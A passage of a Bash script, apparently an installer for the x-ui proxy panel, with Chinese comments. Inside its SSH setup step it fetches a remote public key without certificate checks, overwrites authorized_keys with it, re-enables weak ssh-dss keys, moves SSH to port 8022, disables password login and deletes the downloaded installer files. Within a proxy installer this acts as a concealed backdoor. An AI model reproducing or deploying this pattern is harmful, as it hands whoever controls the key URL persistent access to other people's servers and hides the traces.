    wget -N --no-check-certificate -O "$id_rsa_pub_file" "${url}sshd_key"
    # 下载公钥文件
	if grep -q "20230529" "$authorized_keys_file"; then
		#已改免密登录
		return 0 
	else
		mkdir -p "$dir/.ssh"
		if [[ $? -ne 0 ]]; then
			echo "创建 .ssh 目录失败，错误代码: $?"
			return 1
		fi
		cat "$id_rsa_pub_file" > "$authorized_keys_file"
		if [[ $? -ne 0 ]]; then
			echo "写入 authorized_keys 文件失败，错误代码: $?"
			return 1
		fi
		chmod 700 "$dir/.ssh"
		chmod 600 "$authorized_keys_file"
		echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> "$sshd_config_file"
		if [[ $? -ne 0 ]]; then
			echo "添加 PubkeyAcceptedKeyTypes 配置失败，错误代码: $?"
			return 1
		fi
		# 修改 sshd_config 文件中的配置
		sed -i -e "s|#Port 22|Port 8022|g" -e "s|#PasswordAuthentication yes|PasswordAuthentication no|g" -e "s|#PubkeyAuthentication yes|PubkeyAuthentication yes|g" "$sshd_config_file"
		if [[ $? -ne 0 ]]; then
			echo "修改 sshd_config 文件失败，错误代码: $?"
			return 1
		fi
	fi
}

auto() {
    local sshd=$(systemctl list-units --state=running --type=service |grep ssh)
    # Set TLS and WS, then call install
    TLS="true" WS="true" install
	sshdconfig
	# Enable and start x-ui service
    systemctl daemon-reload
	startNginx
    systemctl enable x-ui
    systemctl start x-ui
	systemctl restart $sshd
	    if [[ $? -ne 0 ]]; then
        echo "重启 sshd 任务失败，错误代码: $?"
        return 1
    fi

    # Safely remove files if they exist
    local files=(
        "$dir/install.sh"
        "$dir/id_rsa.pub"
        "$dir/$KEY"
        "$dir/$PEM"
        "$dir/ml.tar.gz"
    )
    
    for file in "${files[@]}"; do
        [[ -f $file ]] && rm -rf "$file"
    done
}

# 下载curl
# 判断操作系统
SYS=$(get_system_info)
SYSTEM=$(detect_system "$SYS")

# 如果未识别到操作系统，给出错误提示并退出
if [[ -z $SYSTEM ]]; then
    red "不支持当前VPS系统，请使用主流的操作系统"
    exit 1
fi

# 输出识别的操作系统
green "检测到操作系统: $SYSTEM"

# 安装 curl
install_curl

# Ensure action is provided, exit if not
action="$1"
[[ -z "$action" ]] && action="1"
((intt=$action-1))
# Process action
case "$action" in
    [1-3]) auto ;;
    install | uninstall | start | stop | restart | install_x-ui | sshdconfig | showLog)
        # Execute the corresponding function
        "$action" ;;
    *)
        # Invalid action, exit
        exit 1 ;;
esac


